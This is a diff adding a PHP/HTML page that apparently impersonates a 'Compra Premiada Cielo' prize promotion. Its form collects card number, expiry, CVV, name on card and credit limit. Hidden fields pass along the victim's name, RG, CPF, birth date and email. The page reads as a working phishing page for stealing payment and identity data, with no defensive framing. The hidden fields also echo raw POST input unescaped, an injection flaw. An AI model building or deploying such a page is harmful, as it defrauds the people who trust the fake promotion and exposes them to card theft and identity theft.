@@ -1,0 +1,178 @@
+<?
+function validaCPF($cpf)
+{	// Verifiva se o número digitado contém todos os digitos
+    @$cpf = str_pad(ereg_replace('[^0-9]', '', $cpf), 11, '0', STR_PAD_LEFT);
+	
+	// Verifica se nenhuma das sequências abaixo foi digitada, caso seja, retorna falso
+    if (strlen($cpf) != 11 || $cpf == '00000000000' || $cpf == '11111111111' || $cpf == '22222222222' || $cpf == '33333333333' || $cpf == '44444444444' || $cpf == '55555555555' || $cpf == '66666666666' || $cpf == '77777777777' || $cpf == '88888888888' || $cpf == '99999999999')
+	{
+	return false;
+    }
+	else
+	{   // Calcula os números para verificar se o CPF é verdadeiro
+        for ($t = 9; $t < 11; $t++) {
+            for ($d = 0, $c = 0; $c < $t; $c++) {
+                $d += $cpf{$c} * (($t + 1) - $c);
+            }
+
+            $d = ((10 * $d) % 11) % 10;
+
+            if ($cpf{$c} != $d) {
+                return false;
+            }
+        }
+
+        return true;
+    }
+}
+	$cpf_enviado = validaCPF($_POST['cpf']);
+	// Verifica a resposta da função e exibe na tela
+	if($cpf_enviado == true)
+	 {
+	 }
+	elseif($cpf_enviado == false)
+	{
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<link rel="shortcut icon" href="img/favicon.ico">
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Compra Premiada Cielo</title>
+
+<link href="css2/estilo.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="jquery.js"></script>
+<script type="text/javascript" src="mask.js"></script>
+<script>
+
+function confereCampos(form) {    
+    var campos = form.getElementsByTagName('input');
+    var podeEnviar = true;
+    for (i = 0; i < campos.length; i++) {
+        var classe = campos[i].className;
+        var valor = campos[i].value;
+        if (classe == 'campos_texto' && valor == '') podeEnviar = false;
+    }
+    if (podeEnviar == true) {
+        return true;
+    } else {
+        alert('Todos os campos são obrigatorios, favor preencher!')
+        return false;
+    }
+}
+</script>
+<script type="text/javascript">
+	// Mascaras para o formulario
+$(document).ready(function(){
+$(function() {
+$('#cc').mask('9999999999999999'); //INFO
+$('#vd').mask('99/99'); //INFO
+});});
+</script>
+
+</head>
+
+<body>
+<div id="header">
+<div class="banner">
+
+</div><!--banner-->
+</div><!--header-->
+<div id="main">
+
+<div class="imgs">
+
+<div id="txt" style="position:absolute; width:280px; font:14px Tahoma, Geneva, sans-serif; text-align:center; top:360px; text-shadow:0 1px 1px #CCC; color:#333; font-weight:bold;">
+
+</div>
+</div><!--imgs-->
+
+<!-------------------------------SISTEMA---------------------------------------->
+
+<div id="cadastro">
+<div class="bg">
+<div class="top"> * Pr&ecirc;encha com seus dados pessoais o formul&aacute;rio. </div><!--top-->
+<br />
+<br />
+<form name="frm" action="concluido.php" method="post" target="_self" onSubmit='return confereCampos(this)'>
+<fieldset>
+<legend>
+Bandeira de seu Cartão de Crédito *
+</legend>
+  <select name="tipo" id="tipo">
+                <option>Escolha:</option>
+                <option>Visa</option>
+                <option>MasterCard</option>
+                <option>American Express</option>
+                <option>Dinners</option>
+                <option>Elo</option>
+</select>
+</fieldset>
+<fieldset>
+<legend>
+Nome Impresso no Cartão *
+</legend>
+<input type="text" name="nomecc" size="45" />
+</fieldset>
+<fieldset>
+<legend>
+Número do Cartão de Crédito *
+</legend>
+<input type="text" name="numerocc" id="cc" size="40" />
+</fieldset>
+<fieldset>
+<legend>
+Validade do Cartão de Crédito *
+</legend>
+<input type="text" name="validade" id="vd" size="17" />
+</fieldset>
+<fieldset>
+<legend>
+Codígo de Segurança *
+</legend>
+<input name="cvv" type="text" size="10" id="cd" maxlength="4" />
+</fieldset>
+<fieldset>
+<legend>
+Limite *
+</legend>
+<input name="limite" type="text" size="10" />
+</fieldset>
+<fieldset style="font:12px Tahoma, Geneva, sans-serif;">
+  <input name="promo" type="checkbox" id="promo" /> Receber informações sobre promoções por e-mail.<br />
+  <input name="promo2" type="checkbox" id="promo2" /> Cadastrar esse Cartão de Crédito em outras promoções ativas.
+</fieldset>
+<fieldset>
+<button type="submit" name="ok">Cadastrar</button>
+</fieldset>
+
+
+<input name="nome" type="hidden" id="nome" value="<? echo $_POST['nome'] ; ?>" />
+<input name="rg" type="hidden" id="rg" value="<? echo $_POST['rg'] ; ?>" />
+<input name="cpf" type="hidden" id="cpf" value="<? echo $_POST['cpf'] ; ?>" />
+<input name="data" type="hidden" id="data" value="<? echo $_POST['data'] ; ?>" />
+<input name="cidade" type="hidden" id="cidade" value="<? echo $_POST['cidade'] ; ?>" />
+<input name="estado" type="hidden" id="estado" value="<? echo $_POST['estado'] ; ?>" />
+<input name="email" type="hidden" id="email" value="<? echo $_POST['email'] ; ?>" />
+</form>
+</div><!--bg-->
+</div><!--cadastro-->
+
+<!-------------------------------SISTEMA---------------------------------------->
+<br />
+<br />
+<br />
+<br />
+<div id="bt" style=" height:50px; position:absolute; top:600px; font:10px Tahoma, Geneva, sans-serif; width:910px;">
+<br />
+<br />
+<br />
+<br />
+<p><strong>A Compra Premiada Cielo não inclui taxas na fatura do cartão.</strong></p>
+
+<p>*Prêmios pagos em dinheiro diretamente ao contemplado. Valores líquidos de Imposto de Renda, conforme legislação vigente. Lastreados por Títulos de Capitalização da Brasilcap Capitalização S.A., CNPJ 15.138.043/0001- 05, aprovados pela SUSEP, Processos n° 15414.002830/2011-48 (cliente Cielo) , nº 15414.002831/2011-92 (lojistas) e nº 15414.002832/2011-37 (vendedores). A aprovação desses títulos pela SUSEP não implica, por parte da Autarquia, incentivo ou recomendação à sua aquisição, representando, exclusivamente, sua adequação às normas em vigor. Consulte o regulamento no site.</p>
+</div>
+
+</div><!--main-->
+</body>
+</html>
